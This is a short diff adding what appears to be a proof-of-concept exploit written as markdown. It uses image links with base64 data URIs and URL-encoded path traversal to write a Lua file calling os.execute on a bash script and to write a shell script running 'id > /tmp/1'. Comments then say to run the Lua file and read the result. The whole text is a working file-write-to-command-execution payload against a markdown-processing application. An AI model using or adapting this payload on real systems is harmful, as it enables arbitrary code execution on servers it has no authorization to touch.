@@ -1,0 +1,9 @@
+# Write os.execute("/bin/bash /tmp/a.sh"); to /tmp/a.lua
+![](data://image/png;base64,b3MuZXhlY3V0ZSgiL2Jpbi9iYXNoIC90bXAvYS5zaCIpOw==;.lua%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2Ftmp%2fa%2elua)
+
+# Write command "id > /tmp/1" to a.sh
+![](data://image/png;base64,aWQgID4gL3RtcC8xIA==;.lua%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2Ftmp%2fa%2esh)
+
+# run /tmp/a.lua
+
+# read /tmp/1 to get result
